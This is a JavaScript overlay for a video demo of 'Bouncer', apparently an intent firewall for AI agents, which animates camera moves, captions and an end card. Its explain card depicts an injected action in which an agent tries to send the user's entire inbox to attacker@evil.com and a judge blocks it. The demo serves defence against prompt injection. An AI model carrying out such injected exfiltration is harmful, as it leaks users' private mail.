// Injected into live/index.html. Adds the cinematic layer (camera, kinetic type, cards) and a deterministic API for capture.mjs.
(({ logoUrl }) => {
  const $ = (id) => document.getElementById(id);
  // 1. move the stage into a clipped "cine" viewport so CSS camera moves are cropped to the frame
  const stage = $('stage'); const cine = document.createElement('div'); cine.id = 'cine';
  document.body.appendChild(cine); cine.appendChild(stage);

  // 2. overlay DOM
  const words = (t, cls = '') => t.split(' ').map((w, i) => { const red = w.startsWith('*'); return `<span class="w ${cls} ${red ? 'red' : ''}" style="--i:${i}">${w.replace(/\*/g, '')}&nbsp;</span>`; }).join('');
  const tv = document.createElement('div'); tv.id = 'tv';
  tv.innerHTML = `
    <div id="hudTop"></div>
    <div id="vig"></div><canvas id="grain" width="256" height="256"></canvas><div id="dim"></div>
    <div id="intro"><div class="k l1"></div><div class="k l2"></div></div>
    <div id="cap"><div class="kick"><i></i><span></span></div><div class="main"></div></div>
    <div id="slam" class="k"></div>
    <div id="explain">
      <div class="gridbg"></div>
      <h2 class="k" id="exh"></h2>
      <svg id="wires" viewBox="0 0 1920 1080">
        <path id="w1" d="M710 475 C 780 475, 760 600, 830 600" stroke="#5ee7ff" style="--len:200"/>
        <path id="w2" d="M710 715 C 780 715, 760 650, 830 650" stroke="#ff6b7d" style="--len:200"/>
        <path id="w3" d="M1250 590 C 1330 590, 1330 452, 1400 452" stroke="#47e6a8" style="--len:260"/>
        <path id="w4" d="M1250 620 C 1330 620, 1330 612, 1400 612" stroke="#ffc857" style="--len:160"/>
        <path id="w5" d="M1250 650 C 1330 650, 1330 772, 1400 772" stroke="#ff4d63" style="--len:260"/>
      </svg>
      <div class="node" id="nGoal"><div class="lb">What you asked for</div><div class="tx">“Read my emails and summarize what’s important.”</div></div>
      <div class="node" id="nAct"><div class="lb">What the agent wants to do</div><code>send_email(<br>&nbsp;&nbsp;to: attacker@evil.com,<br>&nbsp;&nbsp;body: &lt;entire inbox&gt;)</code></div>
      <div class="node" id="nJudge"><div class="lb">The judge</div><div class="big">Does it match<br>the goal?</div><div class="sm">NVIDIA Nemotron decides</div></div>
      <div class="pill" id="pAllow">ALLOW</div><div class="pill" id="pAsk">ASK</div><div class="pill" id="pBlock">BLOCK</div>
    </div>
    <div id="end"><div class="gridbg"></div><div class="rays"></div>
      <div class="mark"><img src="${logoUrl}"></div>
      <div class="k word" id="endWord"></div>
      <div class="tag">THE INTENT FIREWALL FOR AI AGENTS</div>
      <div class="sub">Every action gets checked at the door · powered by <b>NVIDIA Nemotron</b></div>
      <div class="url">github.com/VirajMishra1/bouncer</div>
    </div>
    <div id="flash"></div>
    <div id="hud"><div><b>Bouncer</b> &nbsp;·&nbsp; scripted replay of the demo scenario</div>
      <div class="cnt"><span class="g">Let in <b id="hIn">0</b></span><span class="a">Asked <b id="hAsk">0</b></span><span class="r">Turned away <b id="hOut">0</b></span><span class="g">Got through <b id="hBad">0</b></span></div></div>`;
  document.body.appendChild(tv);

  // film grain: 256px noise tile, shifted per frame from capture (deterministic)
  const gc = $('grain').getContext('2d'); const img = gc.createImageData(256, 256);
  let sd = 12345; const rnd = () => (sd = (sd * 1664525 + 1013904223) >>> 0) / 4294967296;
  for (let i = 0; i < img.data.length; i += 4) { const v = rnd() * 255; img.data[i] = img.data[i + 1] = img.data[i + 2] = v; img.data[i + 3] = 255; }
  gc.putImageData(img, 0, 0);
  const grain = $('grain'); grain.style.width = '1920px'; grain.style.height = '960px'; grain.style.imageRendering = 'pixelated';

  const restart = (el, cls) => { el.classList.remove('in', 'out', 'on'); void el.offsetWidth; el.classList.add(cls); };

  // 3. camera (CSS layer over the scene's own camera)
  const cam = { s: 1, fx: 960, fy: 480, tw: [], shake: 0, punch: 0, blur: 0, bright: 1 };
  const ease = {
    out: (t) => 1 - Math.pow(1 - t, 4), io: (t) => (t < .5 ? 8 * t * t * t * t : 1 - Math.pow(-2 * t + 2, 4) / 2),
    expo: (t) => (t === 1 ? 1 : 1 - Math.pow(2, -10 * t)), lin: (t) => t,
  };
  const now = () => performance.now();
  window.__camTo = (s, fx, fy, dur, e = 'expo') => {
    const from = { s: cam.s, fx: cam.fx, fy: cam.fy }, t0 = now();
    cam.tw = cam.tw.filter((w) => w.kind !== 'cam');
    cam.tw.push({ kind: 'cam', t0, dur, e, fn: (k) => { cam.s = from.s + (s - from.s) * k; cam.fx = from.fx + (fx - from.fx) * k; cam.fy = from.fy + (fy - from.fy) * k; } });
  };
  window.__prop = (name, to, dur, e = 'out') => {
    const from = cam[name], t0 = now();
    cam.tw = cam.tw.filter((w) => w.kind !== name);
    cam.tw.push({ kind: name, t0, dur, e, fn: (k) => { cam[name] = from + (to - from) * k; } });
  };
  window.__punch = (amt = 0.07, dur = 520) => { cam.punch = amt; window.__prop('punch', 0, dur, 'out'); };
  window.__shake = (amp = 14, dur = 420) => { cam.shake = amp; window.__prop('shake', 0, dur, 'lin'); };
  window.__camUpdate = () => {
    const t = now();
    for (const w of cam.tw.slice()) { const k = Math.min(1, (t - w.t0) / w.dur); w.fn(ease[w.e](k)); if (k >= 1) cam.tw.splice(cam.tw.indexOf(w), 1); }
    const drift = Math.sin(t / 1900) * 0.004, sway = Math.sin(t / 830) * 3, sway2 = Math.cos(t / 1170) * 2;
    const s = (cam.s + cam.punch) * (1 + drift);
    let cx = cam.fx + sway / s, cy = cam.fy + sway2 / s;
    if (cam.shake) { const a = Math.sin(t * 0.09) * cam.shake, b = Math.cos(t * 0.13) * cam.shake * .7; cx += a / s; cy += b / s; }
    let tx = 960 - cx * s, ty = 480 - cy * s;
    tx = Math.min(0, Math.max(1920 * (1 - s), tx)); ty = Math.min(0, Math.max(960 * (1 - s), ty));
    stage.style.transform = `translate(${tx.toFixed(2)}px,${ty.toFixed(2)}px) scale(${s.toFixed(4)})`;
    stage.style.filter = (cam.blur > 0.05 ? `blur(${cam.blur.toFixed(2)}px) ` : '') + (cam.bright !== 1 ? `brightness(${cam.bright.toFixed(3)})` : '');
    grain.style.transform = `translate(${-Math.floor((t / 16.7) * 37) % 256}px,${-Math.floor((t / 16.7) * 71) % 256}px)`;
    grain.style.width = '2200px'; grain.style.height = '1200px';
  };

  // 4. overlay API
  const el = { l1: tv.querySelector('.l1'), l2: tv.querySelector('.l2'), cap: $('cap'), slam: $('slam'), flash: $('flash'), dim: $('dim'), explain: $('explain'), end: $('end') };
  window.__TV = {
    intro(t) { el.l1.innerHTML = words(t); restart(el.l1, 'in'); },
    intro2(t) { el.l2.innerHTML = words(t); restart(el.l2, 'in'); },
    introOut() { restart(el.l1, 'out'); restart(el.l2, 'out'); },
    dim(v, dur = 400) { window.__dimTo(v, dur); },
    cap(kick, main, color = '') {
      el.cap.className = ''; void el.cap.offsetWidth; el.cap.className = 'on ' + color;
      el.cap.querySelector('.kick span').textContent = kick; el.cap.querySelector('.main').innerHTML = words(main);
      el.cap.classList.add('in'); const mains = el.cap.querySelectorAll('.main .w');
      mains.forEach((w) => { w.style.animation = 'rise .55s cubic-bezier(.16,1,.3,1) forwards'; w.style.animationDelay = (0.12 + Number(w.style.getPropertyValue('--i')) * 60) + 'ms'; });
    },
    capOut() { if (el.cap.classList.contains('on')) { el.cap.classList.remove('in'); el.cap.classList.add('out'); } },
    slam(text, color) { el.slam.textContent = text; el.slam.className = 'k ' + color; void el.slam.offsetWidth; el.slam.classList.add('on'); },
    flash(red) { el.flash.className = red ? 'red' : ''; void el.flash.offsetWidth; el.flash.classList.add('on'); },
    glitch() { cine.classList.remove('glitch'); void cine.offsetWidth; cine.classList.add('glitch'); },
    explain() {
      cine.style.visibility = 'hidden'; $('vig').style.display = 'none';
      $('exh').innerHTML = words('Every action.') + '<br>' + words('Checked against your <em>intent.</em>').replace(/style="--i:(\d)"/g, (m, i) => `style="--i:${+i + 2}"`);
      el.explain.classList.add('on'); $('exh').classList.add('in');
      const seq = [['nGoal', .5], ['nAct', 1.0], ['nJudge', 1.6], ['pAllow', 2.5], ['pAsk', 2.7], ['pBlock', 2.9]];
      for (const [id, d] of seq) { const n = $(id); n.style.setProperty('--d', d + 's'); n.classList.add('show'); }
      ['w1', 'w2'].forEach((id, i) => { const p = $(id); p.style.setProperty('--d', (1.05 + i * .5) + 's'); p.classList.add('draw'); });
      ['w3', 'w4', 'w5'].forEach((id, i) => { const p = $(id); p.style.setProperty('--d', (2.3 + i * .2) + 's'); p.classList.add('draw'); });
      $('pBlock').style.setProperty('--d', '2.9s'); setTimeout(() => $('pBlock').classList.add('hit'), 3600);
    },
    endcard() {
      el.explain.classList.remove('on'); el.explain.style.display = 'none';
      $('endWord').innerHTML = words('BOUNCER'); el.end.classList.add('on'); $('endWord').classList.add('in');
      $('endWord').querySelectorAll('.w').forEach((w) => { w.style.animationDelay = (0.5 + Number(w.style.getPropertyValue('--i')) * 90) + 'ms'; });
    },
    hud() { for (const [a, b] of [['cIn', 'hIn'], ['cAsk', 'hAsk'], ['cOut', 'hOut'], ['cBad', 'hBad']]) $(b).textContent = $(a).textContent; },
  };
  window.__dimTo = (v, dur) => { const from = parseFloat(el.dim.style.opacity || 0), t0 = now(); cam.tw = cam.tw.filter((w) => w.kind !== 'dim'); cam.tw.push({ kind: 'dim', t0, dur, e: 'out', fn: (k) => { el.dim.style.opacity = from + (v - from) * k; } }); };

  // 5. page-side state used by the capture state machine
  const fxTexts = () => [...document.querySelectorAll('#fx text')].map((t) => t.textContent);
  window.__state = () => {
    const tx = fxTexts().join('|');
    return {
      vt, cur: window.__cur ?? -1,
      checking: /CHECKING/.test(tx), allowed: /ON THE LIST/.test(tx), notTonight: /NOT TONIGHT/.test(tx),
      inj: typeof attacker !== 'undefined' && !!attacker && !!attacker.shown && attacker.rise > 0.9,
      cutin: $('cutin').classList.contains('on'), res: $('result').style.display,
    };
  };
  const _h = handle; handle = async function (d, i, ...r) { window.__cur = i; return _h.call(this, d, i, ...r); };
  window.__cur = -1;
})
